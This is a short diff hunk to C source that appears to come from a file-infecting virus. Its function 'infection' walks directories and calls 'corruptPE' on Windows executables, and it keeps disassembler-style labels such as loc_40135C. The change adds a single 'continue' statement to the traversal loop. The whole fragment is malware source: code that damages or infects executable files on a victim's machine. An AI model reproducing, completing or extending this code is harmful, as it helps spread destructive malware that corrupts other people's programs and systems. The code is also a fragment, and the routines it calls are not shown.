@@ -256,6 +256,7 @@ void infection(char* path, int depth){
 		if (strcmp(storage + strlen(storage) - 4, exe)){
 			corruptPE(storage);
 		}
+		continue;
 		loc_40135C:
 		memcpy(storage, fileData.cFileName, strlen(fileData.cFileName));
 		memcpy(storage, dirWildcard, strlen(dirWildcard) + 1);
